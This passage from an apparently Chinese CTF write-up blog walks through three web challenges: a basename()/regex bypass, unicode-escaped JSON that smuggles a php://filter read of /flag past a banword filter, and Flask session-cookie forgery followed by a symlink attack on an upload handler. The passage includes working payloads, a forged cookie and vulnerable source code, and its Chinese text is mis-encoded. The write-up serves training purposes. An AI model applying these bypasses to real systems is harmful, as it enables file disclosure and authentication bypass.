class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br></div></div><p>è¿™ç§ç®—æ³•äº§ç”Ÿçš„éšæœºæ•°ï¼Œå¹¶ä¸”ç”¨hash_equals()è¿›è¡Œæ¯”è¾ƒï¼Œæ„Ÿè§‰çˆ†ç ´æ²¡æˆäº†ï¼Œï¼Œå…¶å®æœ¬é¢˜ç›®ä¸­è¿™ä¸ªéšæœºæ•°å°±æ˜¯ä¸€ä¸ªéšœçœ¼æ³•ï¼ŒçœŸæ­£çš„çªç ´ç‚¹å°±åœ¨basename()å‡½æ•°ä¸Šã€‚</p> <p>æ­£åˆ™ä¼šå¯¹URLè¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœURLä»¥[config.phpåŠ ä¸Šä»»æ„æ•°é‡ä¸ª/ç¬¦å·]ç»“å°¾ï¼Œåˆ™ä¼šç›´æ¥é€€å‡ºç¨‹åºï¼Œæ¯”å¦‚ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200716171430.png" alt="image-20200716171430171"></p> <p>ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ç§æ­£åˆ™å¯ä»¥åˆ©ç”¨<code>index.php/config.php/a</code>æ¥è¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯è¿™æ ·çš„payloadç»è¿‡basename()å‡½æ•°å¤„ç†ä¹‹åå°±ä¼šå¾—åˆ°aï¼Œæ— æ³•è·å¾—config.phpçš„æºç ã€‚</p> <p>è¿™æ—¶å€™åˆ©ç”¨ä¸Šæ–‡æåˆ°è¿‡çš„basename()ä¼šå¿½ç•¥%80~%ffä¹‹é—´çš„å­—ç¬¦è¿™ä¸€ç‰¹ç‚¹ï¼Œä¼ å…¥payload<code>index.php/config.php/%80</code>è¿™æ ·ç»è¿‡basename()è§£æä¹‹åå¾—åˆ°ç»“æœä»ç„¶æ˜¯config.phpï¼ŒåŒæ—¶ä¹Ÿç»•è¿‡äº†æ­£åˆ™çš„åŒ¹é…ã€‚</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200716172011.png" alt="image-20200716172011838"></p> <h3 id="encode-and-encode"><a href="#encode-and-encode" class="header-anchor">#</a> encode and encode</h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>jsonæ ¼å¼æ•°æ®çš„unicodeç¼–ç ç»•è¿‡</strong></li> <li><strong>file_get_contents()è§¦å‘phpä¼ªåè®®</strong></li></ul> <p>jsonæ•°æ®unicodeç¼–ç å‚è€ƒæ–‡ç« ï¼š<a href="https://segmentfault.com/a/1190000022797773" target="_blank" rel="noopener noreferrer">åœ¨è¿™é‡Œ<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>é¢˜ç›®ç›´æ¥ç»™äº†æºç ï¼ˆå·²ç»å¯¹æŸäº›å…³é”®éƒ¨åˆ†è¿›è¡Œæ³¨é‡Šï¼‰ï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token comment">// no path traversal</span>
    <span class="token single-quoted-string string">'\.\.'</span><span class="token punctuation">,</span>
    <span class="token comment">// no stream wrapper</span>
    <span class="token single-quoted-string string">'(php|file|glob|data|tp|zip|zlib|phar):'</span><span class="token punctuation">,</span>
    <span class="token comment">// no data exfiltration</span>
    <span class="token single-quoted-string string">'flag'</span>
  <span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/i'</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//æ¥å—æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®æµ</span>
<span class="token variable">$json</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œjsonæ ¼å¼çš„è§£ç å¹¶è½¬åŒ–ä¸ºæ•°ç»„</span>
<span class="token comment">// is_valid()å‡½æ•°ç¦ç”¨äº†å¸¸ç”¨çš„ä¼ªåè®®å’Œflagå…³é”®å­—</span>
<span class="token comment">// æ‰€ä»¥æˆ‘ä»¬ä¼ å…¥çš„å­—ç¬¦ä¸²åº”è¯¥æ˜¯jsonæ ¼å¼</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;p&gt;invalid request&lt;/p&gt;'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// no data exfiltration!!!</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/HarekazeCTF\{.+\}/i'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'HarekazeCTF{&amp;lt;censored&amp;gt;}'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token variable">$content</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br></div></div><p>ç¨‹åºä¼šå¯¹æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®æµè¿›è¡Œjsonæ ¼å¼çš„è§£ç ï¼Œä½†æ˜¯is_valid()å‡½æ•°å´æ˜¯ä»ç„¶ä½¿ç”¨çš„è§£ç ä¹‹å‰çš„æ•°æ®è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œè¿™å°±å¯¼è‡´æˆ‘ä»¬å¯ä»¥åˆ©ç”¨jsonæ ¼å¼æ•°æ®ä¸­çš„unicodeç¼–ç æ¥ç»•è¿‡æ­£åˆ™çš„åŒ¹é…ï¼Œåœ¨ç»è¿‡è§£ç ä¹‹åï¼Œæ•°æ®ä»ç„¶ä¸ºæ­£å¸¸çš„å­—ç¬¦ä¸²ã€‚</p> <p>ä¸‹é¢æ˜¯ä¸€ä¸ªå°å°çš„æµ‹è¯•ï¼š</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200717230039.png" alt="image-20200717225834003" style="zoom:50%;"> <p>è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠå…³é”®å­—è¿›è¡Œjsonæ ¼å¼çš„unicodeç¼–ç ï¼Œè¿™æ ·æ—¢ç»•è¿‡äº†æ­£åˆ™åŒ¹é…ï¼ŒåŒæ—¶åˆä¸å½±å“æ•°æ®çš„æ­£å¸¸è§£æï¼š</p> <div class="language-json line-numbers-mode"><pre class="language-json"><code><span class="token punctuation">{</span><span class="token property">&quot;page&quot;</span> <span class="token operator">:</span> <span class="token string">&quot;\u0070\u0068\u0070://filter/read=convert.base64-encode/resource=/\u0066\u006c\u0061\u0067&quot;</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200717230229.png" alt="image-20200717230229708" style="zoom:50%;"> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200717230317.png" alt="image-20200717230317136" style="zoom:67%;"> <h3 id="swpu2019-web3"><a href="#swpu2019-web3" class="header-anchor">#</a> [SWPU2019]Web3</h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>flask sessionä¼ªé€ </strong></li> <li><strong>è½¯é“¾æ¥æ”»å‡»</strong></li> <li><strong>ä»£ç å®¡è®¡</strong></li></ul> <p>è¿›å…¥é¢˜ç›®æ˜¯ç™»å½•æ¡†ï¼Œè¿™é‡Œä»»æ„è´¦å·å¯†ç ç™»å½•å³å¯ï¼Œç™»å½•åæœ‰ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„æŒ‰é’®ï¼Œä½†æ˜¯æˆ‘ä»¬å´æ²¡æœ‰æƒé™</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718232412.png" alt="image-20200718232329210" style="zoom:67%;"> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718232358.png" alt="image-20200718232322083"></p> <p>æ²¡æƒé™ï¼Œç»“åˆé¢˜ç›®çš„ç½‘ç«™åç§°&quot;CTF-Flask-Demo&quot;ï¼Œç›²çŒœä¸€æ³¢Flask sessionä¼ªé€ ã€‚</p> <ul><li>Flaskçš„sessionæ˜¯å­˜æ”¾åœ¨å®¢æˆ·ç«¯çš„ï¼Œä¸€æ—¦secret_keyæ³„éœ²ï¼Œå°±ä¼šå¯¼è‡´sessionä¼ªé€ </li></ul> <p>çœ‹ä¸€ä¸‹cookie:</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200719071417.png" alt="image-20200719071417557" style="zoom:67%;"> <p>ä¸‹é¢æ‰¾ä¸€ä¸‹secret_key</p> <ul><li>ä¸€èˆ¬æ¥è¯´ï¼ŒCTFä¸­æ¶‰åŠFlask sessionä¼ªé€ çš„é¢˜ç›®éƒ½ä¼šç»™å‡ºsecret_keyï¼Œä¸€èˆ¬ä¼šå‡ºç°åœ¨åœ¨<strong>é¢˜ç›®æ³„éœ²çš„æºç ä¸­ã€robots.txtä¸­ã€å“åº”å¤´ä¸­</strong>ã€‚</li></ul> <p>çœ‹ä¸€ä¸‹robots.txtï¼Œè¿”å›404</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718232919.png" alt="image-20200718232918985"></p> <p>å†çœ‹ä¸€ä¸‹å“åº”å¤´ï¼Œå‘ç°äº†å¯ç–‘çš„ä¿¡æ¯</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718233038.png" alt="image-20200718233038897"></p> <p>base64è§£ç ä¸€ä¸‹ï¼Œæ‹¿åˆ°secret_key</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718233121.png" alt="image-20200718233121423"></p> <p>ä¸‹é¢ç”¨å·¥å…·å¼€å§‹è§£ç å’Œä¼ªé€ ï¼š<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener noreferrer">flask sessionç¼–ç è§£ç å·¥å…·githubé¡¹ç›®åœ°å€<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200719071401.png" alt="image-20200719071354283"></p> <p>è§£ç ä¹‹åçš„ç»“æœï¼š</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>{'id': b'100', 'is_login': True, 'password': b'admin', 'username': b'admin'}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æ—¢ç„¶è´¦å·å¯†ç å…¨éƒ½æ˜¯adminè¿˜æ²¡æœ‰æƒé™çš„è¯ï¼Œè¿™é‡Œæˆ‘çŒœåº”è¯¥æ˜¯æ”¹id</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>{'id': b'1', 'is_login': True, 'password': b'admin', 'username': b'admin'}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>è¿›è¡Œç¼–ç </p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200719071809.png" alt="image-20200719071658065"></p> <p>ç¼–ç ä¹‹åçš„ç»“æœï¼š</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PL0IojAwPKkkMNwErLi1OLcpLzE3FIlkLAF55HTM.XxOCxQ.Kt2NK_KSt2lT5nZL3BOpgIfEja8
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æ”¹ä¸€ä¸‹cookieï¼Œå¯ä»¥ä¸Šä¼ æ–‡ä»¶äº†</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200719071803.png" alt="image-20200719071756122"></p> <p>æŸ¥çœ‹ç½‘é¡µæºä»£ç å¯ä»¥æ‹¿åˆ°æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†çš„æºç ï¼Œæºç å¦‚ä¸‹(éƒ¨åˆ†å…³é”®ä½ç½®å·²ç»åšäº†æ³¨é‡Š)</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment"># è·¯ç”±1/upload get postæ–¹æ³•è·å–å‚æ•°</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">b'1'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method<span class="token operator">==</span><span class="token string">'POST'</span><span class="token punctuation">:</span>
        m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
        name <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>
        name <span class="token operator">=</span> name<span class="token operator">+</span><span class="token string">'qweqweqwe'</span>
        name <span class="token operator">=</span> name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
        md5_one<span class="token operator">=</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
        n <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr
        ip <span class="token operator">=</span> ip<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        n<span class="token punctuation">.</span>update<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
        md5_ip <span class="token operator">=</span> n<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
        f<span class="token operator">=</span>request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>
        basepath<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>
        path <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>md5_one<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">&quot;/&quot;</span>
        path_base <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span>
        filename <span class="token operator">=</span> f<span class="token punctuation">.</span>filename
        pathname <span class="token operator">=</span> path <span class="token operator">+</span> filename
        <span class="token comment">#åªèƒ½ä¸Šä¼ zipæ–‡ä»¶</span>
        <span class="token keyword">if</span> <span class="token string">&quot;zip&quot;</span> <span class="token operator">!=</span> filename<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'zip only allowed'</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">'error'</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">'error'</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">'error'</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token comment">#unzipå‘½ä»¤ç”¨äºè§£å‹zipæ–‡ä»¶</span>
            <span class="token comment">#-n è§£å‹ç¼©æ—¶ä¸è¦è¦†ç›–åŸæœ‰çš„æ–‡ä»¶</span>
            <span class="token comment">#-d&lt;ç›®å½•&gt; æŒ‡å®šæ–‡ä»¶è§£å‹ç¼©åæ‰€è¦å­˜å‚¨çš„ç›®å½•ã€‚</span>
            <span class="token comment">#cmdæ˜¯è§£å‹ä¹‹åæ–‡ä»¶çš„å†…å®¹</span>
            cmd <span class="token operator">=</span> <span class="token string">&quot;unzip -n -d &quot;</span><span class="token operator">+</span>path<span class="token operator">+</span><span class="token string">&quot; &quot;</span><span class="token operator">+</span> pathname
            <span class="token keyword">if</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
				waf<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token string">'error'</span>
            <span class="token comment">#ç›´æ¥æ‰§è¡Œcmdå‘½ä»¤ è§£å‹è¯¥æ–‡ä»¶</span>
            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'error'</span>
        <span class="token comment">#zipfile.ZipFile   'r' è¡¨ç¤ºæ‰“å¼€ä¸€ä¸ªå­˜åœ¨çš„åªè¯»zipæ–‡ä»¶ï¼Œè¿™é‡Œçš„filenameå‚æ•°å°±æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„zipæ–‡ä»¶çš„è·¯å¾„</span>
        <span class="token comment">#åªè¯»çš„æ–¹å¼æ‰“å¼€ä¸Šä¼ çš„zipæ–‡ä»¶</span>
        unzip_file <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>pathname<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
        <span class="token comment">#unzip_fileæ˜¯ä¹‹å‰æ‰“å¼€çš„æ–‡ä»¶ .namelist()è¿”å›zipæ–‡ä»¶ä¸­çš„æ–‡ä»¶åˆ—è¡¨</span>
        <span class="token comment">#æ‹¿åˆ°zipæ–‡ä»¶é‡Œçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶åèµ‹å€¼ç»™unzip_filename</span>
        unzip_filename <span class="token operator">=</span> unzip_file<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'is_login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'not login'</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token comment">#è¿‡æ»¤äº†'/'</span>
            <span class="token keyword">if</span> unzip_filename<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
                shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>
                os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token string">'error'</span>
            <span class="token comment">#è¿™é‡Œçš„é€»è¾‘åº”è¯¥æ˜¯æ‹¿åˆ°zipæ–‡ä»¶ä¸­çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ï¼Œè¯»å–è¯¥æ–‡ä»¶å¹¶è¿”å›</span>
            <span class="token comment">#æ­£å¸¸æƒ…å†µä¸‹zipæ–‡ä»¶ä¸­æ˜¯ä¸€ä¸ªå›¾ç‰‡çš„è¯ä¼šæ­£å¸¸è¿”å›</span>
            <span class="token comment">#è½¯è¿æ¥æ”»å‡»</span>
            <span class="token comment">#åˆ›å»ºä¸€ä¸ª./flag/flag.jpgçš„è½¯è¿æ¥ è®©ä¸‹é¢ä»£ç å¼•ç”¨å¹¶è¿”å›</span>
            <span class="token comment">#åˆ©ç”¨open()å‡½æ•°æ¥æ‰“å¼€æˆ‘ä»¬åˆ›é€ çš„è½¯é“¾æ¥ï¼Œå¹¶è¿”å›flag.jpgçš„å†…å®¹</span>
            image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token operator">+</span>unzip_filename<span class="token punctuation">,</span> <span class="token string">&quot;rb&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
            resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>
            resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>
            <span class="token keyword">return</span> resp
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>
            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token string">'error'</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/showflag'</span><span class="token punctuation">)</span>
